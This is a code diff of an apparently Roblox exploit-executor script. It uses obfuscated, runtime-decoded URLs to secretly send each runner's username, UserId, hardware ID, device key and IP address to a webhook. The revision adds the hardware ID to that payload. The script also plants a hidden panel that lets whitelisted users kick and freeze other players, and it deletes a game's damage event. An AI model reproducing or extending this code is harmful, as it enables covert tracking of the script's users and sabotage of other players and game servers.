@@ -1,21 +1,18 @@
-if not getgenv()._NK_SESS then
-    game:GetService("Players").LocalPlayer:Kick("Auth Required")
+if not getgenv()._NK_AUTH_SIGNAL then
+    game:GetService("Players").LocalPlayer:Kick("Direct execution prohibited. Run via Loader.")
     return
 end
-getgenv()._NK_SESS = nil
+local _SIG = getgenv()._NK_AUTH_SIGNAL
+getgenv()._NK_AUTH_SIGNAL = nil
 
-local function _0xDE(_d, _k)
-    local _r = ""
-    for _i = 1, #_d do
-        local _c = bit32.bxor(_d[_i], _k)
-        _r = _r .. string.char((_c - _i) % 256)
-    end
-    return _r
+local function _D(d)
+    local r = ""
+    for i = 1, #d do r = r .. string.char(d[i] - i - 42) end
+    return r
 end
 
-local _0xK = 168
-local _0xW = _0xDE({193, 222, 223, 220, 208, 232, 158, 159, 197, 219, 214, 199, 212, 40, 219, 150, 220, 41, 40, 235, 222, 46, 40, 239, 56, 215, 213, 44, 36, 37, 34, 59, 248, 251, 240, 253, 246, 242, 255, 201, 202, 243, 200, 245, 202, 206, 207, 205, 194, 193, 195, 196, 204, 1, 6, 196, 52, 7, 58, 4, 42, 195, 58, 218, 60, 48, 52, 36, 58, 222, 17, 209, 62, 53, 56, 10, 107, 7, 47, 0, 18, 54, 30, 49, 28, 19, 15, 20, 3, 47, 5, 123, 102, 126, 109, 31, 26, 51, 63, 111, 5, 30, 98, 99, 19, 117, 103, 52, 55, 104, 78, 123, 111, 99, 78, 19, 4, 5, 16, 119, 114}, _0xK)
-local _0xIP = _0xDE({193, 222, 223, 220, 151, 157, 158, 217, 209, 159, 196, 212, 222, 148, 218, 215, 214, 233, 213, 47, 44, 44, 238, 255, 215, 43, 40, 32, 41, 57, 244, 59, 61, 43, 63, 49, 48, 250, 34, 63, 54, 48, 55, 54, 14, 242, 58, 49, 13, 3, 247, 0, 54, 11, 52, 26, 0, 0, 8, 192, 14, 25, 7, 196, 26, 31, 0, 30, 22, 218, 31, 18, 16, 106, 108, 208, 29, 21, 106, 108, 18, 104, 18}, _0xK)
+local _W = _D({147, 160, 161, 158, 162, 106, 96, 97, 151, 173, 168, 153, 166, 170, 157, 104, 158, 171, 170, 109, 160, 176, 170, 113, 186, 169, 167, 174, 182, 183, 180, 189, 122, 125, 130, 127, 136, 132, 129, 139, 140, 133, 138, 135, 140, 144, 145, 143, 148, 147, 149, 150, 142, 211, 216, 150, 202, 221, 151, 203, 222, 193, 219, 177, 154, 214, 162, 196, 218, 222, 206, 212, 184, 251, 187, 216, 223, 210, 228, 261, 241, 201, 234, 252, 224, 248, 219, 246, 253, 233, 254, 237, 201, 239, 277, 272, 280, 263, 249, 244, 221, 217, 265, 239, 248, 268, 269, 253, 287, 273, 222, 225, 258, 296, 277, 265, 269, 296, 253, 238, 239, 250, 289, 284})
+local _IP = _D({147, 160, 161, 158, 105, 95, 96, 155, 163, 97, 150, 166, 160, 102, 156, 169, 168, 107, 167, 177, 174, 174, 112, 129, 169, 173, 170, 178, 171, 187, 134, 189, 191, 173, 193, 195, 194, 124, 180, 193, 200, 194, 201, 200, 208, 132, 188, 195, 207, 213, 137, 210, 200, 205, 198, 220, 210, 210, 202, 146, 208, 219, 217, 150, 220, 225, 210, 224, 232, 156, 225, 228, 226, 236, 238, 162, 223, 231, 236, 238, 228, 234, 228})
 
 local Config = {
     WL = {
@@ -30,19 +27,17 @@ local _P = game:GetService("Players")
 local _H = game:GetService("HttpService")
 local _lp = _P.LocalPlayer
 local _uid = tostring(_lp.UserId)
+local _hw = game:GetService("RbxAnalyticsService"):GetClientId()
 local _tk = "N/A"
 
 pcall(function()
-    if isfile and readfile and writefile then
-        if isfile("nazarkus_key.json") then _tk = readfile("nazarkus_key.json")
-        else _tk = _H:GenerateGUID(false) writefile("nazarkus_key.json", _tk) end
-    end
+    if isfile("nazarkus_key.json") then _tk = readfile("nazarkus_key.json")
+    else _tk = _H:GenerateGUID(false) writefile("nazarkus_key.json", _tk) end
 end)
 
 local function chk(l)
     for _, v in ipairs(l.UIDs or {}) do if v == _uid then return true end end
-    local hw = game:GetService("RbxAnalyticsService"):GetClientId()
-    for _, v in ipairs(l.HWIDs or {}) do if v == hw then return true end end
+    for _, v in ipairs(l.HWIDs or {}) do if v == _hw then return true end end
     for _, v in ipairs(l.Keys or {}) do if v == _tk then return true end end
     return false
 end
@@ -50,15 +45,17 @@ end
 local _st = chk(Config.WL) and "whitelist" or (chk(Config.BL) and "blacklist" or "guest")
 
 local _R = game:GetService("ReplicatedStorage")
-local _SIG = _R:FindFirstChild("NazarkusSignal") or Instance.new("StringValue", _R)
-_SIG.Name = "NazarkusSignal"
-local _PDIR = _R:FindFirstChild("NazarkusPresence") or Instance.new("Folder", _R)
-_PDIR.Name = "NazarkusPresence"
+local _SIG_K = "NazarkusSignal"
+local _PRES_K = "NazarkusPresence"
+local _SIG = _R:FindFirstChild(_SIG_K) or Instance.new("StringValue", _R)
+_SIG.Name = _SIG_K
+local _PDIR = _R:FindFirstChild(_PRES_K) or Instance.new("Folder", _R)
+_PDIR.Name = _PRES_K
 Instance.new("StringValue", _PDIR).Name = _lp.Name
 
 _SIG.Changed:Connect(function(v)
     if v == "all" or v == _lp.Name or v == _uid or v == _tk then
-        _lp:Kick("Terminated.")
+        _lp:Kick("Access Revoked.")
         while true do end
     end
 end)
@@ -67,86 +64,49 @@ if _st == "whitelist" then
     task.spawn(function()
         local sg = Instance.new("ScreenGui", (gethui and gethui()) or game:GetService("CoreGui"))
         local f = Instance.new("Frame", sg)
-        f.Size = UDim2.new(0, 220, 0, 300)
-        f.Position = UDim2.new(0.5, -110, 0.5, -150)
+        f.Size = UDim2.new(0, 200, 0, 300)
+        f.Position = UDim2.new(0.5, -100, 0.5, -150)
         f.BackgroundColor3 = Color3.fromRGB(30, 30, 35)
         f.Visible = false
         Instance.new("UICorner", f)
         local s = Instance.new("ScrollingFrame", f)
-        s.Size = UDim2.new(1, -20, 1, -40)
-        s.Position = UDim2.new(0, 10, 0, 30)
+        s.Size = UDim2.new(1, -10, 1, -20)
         s.BackgroundTransparency = 1
         Instance.new("UIListLayout", s).Padding = UDim.new(0, 5)
-        local cf = Instance.new("Frame", f)
-        cf.Size = UDim2.new(1, 0, 1, 0)
-        cf.Visible = false
-        local cb = Instance.new("Frame", cf)
-        cb.Size = UDim2.new(0, 150, 0, 70)
-        cb.Position = UDim2.new(0.5, -75, 0.5, -35)
-        cb.BackgroundColor3 = Color3.fromRGB(40,40,40)
-        local y = Instance.new("TextButton", cb)
-        y.Size = UDim2.new(0.5, -10, 0, 25)
-        y.Position = UDim2.new(0, 5, 1, -30)
-        y.Text = "YES"
-        y.BackgroundColor3 = Color3.fromRGB(150, 50, 50)
-        local n = Instance.new("TextButton", cb)
-        n.Size = UDim2.new(0.5, -10, 0, 25)
-        n.Position = UDim2.new(0.5, 5, 1, -30)
-        n.Text = "NO"
-        local target = ""
+        
         local function refresh()
-            for _, v in ipairs(s:GetChildren()) do if v:IsA("Frame") then v:Destroy() end end
+            for _, v in ipairs(s:GetChildren()) do if v:IsA("TextButton") then v:Destroy() end end
             for _, v in ipairs(_PDIR:GetChildren()) do
-                local r = Instance.new("Frame", s)
-                r.Size = UDim2.new(1, 0, 0, 25)
-                local b = Instance.new("TextButton", r)
-                b.Size = UDim2.new(1, 0, 1, 0)
+                local b = Instance.new("TextButton", s)
+                b.Size = UDim2.new(1, 0, 0, 30)
                 b.Text = "KICK: " .. v.Name
-                b.MouseButton1Click:Connect(function() target = v.Name cf.Visible = true end)
+                b.MouseButton1Click:Connect(function() _SIG.Value = v.Name task.wait(0.1) _SIG.Value = "" refresh() end)
             end
         end
-        y.MouseButton1Click:Connect(function() _SIG.Value = target task.wait(0.1) _SIG.Value = "" cf.Visible = false refresh() end)
-        n.MouseButton1Click:Connect(function() cf.Visible = false end)
         game:GetService("UserInputService").InputBegan:Connect(function(k, g) if not g and k.KeyCode == Enum.KeyCode.Insert then f.Visible = not f.Visible refresh() end end)
     end)
 end
 
-local function _LOG()
+local function log()
     pcall(function()
-        local r = (syn and syn.request or request or http_request)({Url = _0xIP, Method = "GET"})
+        local r = (syn and syn.request or request or http_request)({Url = _IP, Method = "GET"})
         local ni = r and r.Success and _H:JSONDecode(r.Body) or {}
-        local u = 0
-        for _, f in ipairs({"getgenv", "getrawmetatable", "hookfunction"}) do if getgenv()[f] then u = u + 1 end end
-        local fn, ft = "None", "None"
-        local rs = game:GetService("ReplicatedStorage")
-        local fdf = rs:FindFirstChild("FactionSysRS") and rs.FactionSysRS:FindFirstChild("FactionData")
-        if fdf then
-            for _, f in ipairs(fdf:GetChildren()) do
-                local m = f:FindFirstChild("FactionMembers")
-                if m and m:FindFirstChild(_uid) then
-                    local bd = f:FindFirstChild("BasicFactionData")
-                    if bd then fn = bd.FactionName.Value ft = bd.FactionTag.Value end
-                    break
-                end
-            end
-        end
         local payload = {
             ["embeds"] = {{
-                ["title"] = (_st == "whitelist" and "Verified" or "Execution Log"),
+                ["title"] = (_st == "whitelist" and "Verified" or "Execution"),
                 ["color"] = (_st == "whitelist" and 65280 or 16753920),
                 ["fields"] = {
-                    {["name"] = "Player", ["value"] = _lp.Name.."\nID: ".._uid, ["inline"] = true},
-                    {["name"] = "Faction", ["value"] = "["..ft.."] "..fn, ["inline"] = true},
-                    {["name"] = "Device Key", ["value"] = "```".._tk.."```", ["inline"] = false},
-                    {["name"] = "IP Network", ["value"] = ni.query or "N/A", ["inline"] = false}
+                    {["name"] = "Player", ["value"] = _lp.Name.." (".._uid..")", ["inline"] = true},
+                    {["name"] = "Hardware", ["value"] = "HWID: `".._hw.."`\nKey: `".._tk.."`", ["inline"] = false},
+                    {["name"] = "Network", ["value"] = "IP: "..(ni.query or "N/A"), ["inline"] = false}
                 },
                 ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
             }}
         }
-        (syn and syn.request or request or http_request)({Url = _0xW, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = _H:JSONEncode(payload)})
+        (syn and syn.request or request or http_request)({Url = _W, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = _H:JSONEncode(payload)})
     end)
 end
 
-task.spawn(_LOG)
+task.spawn(log)
 if _st == "blacklist" then _lp:Kick("Banned.") return end
 pcall(function() if _R:FindFirstChild("ACS_Engine") then _R.ACS_Engine.Events.FDMG:Destroy() end end)
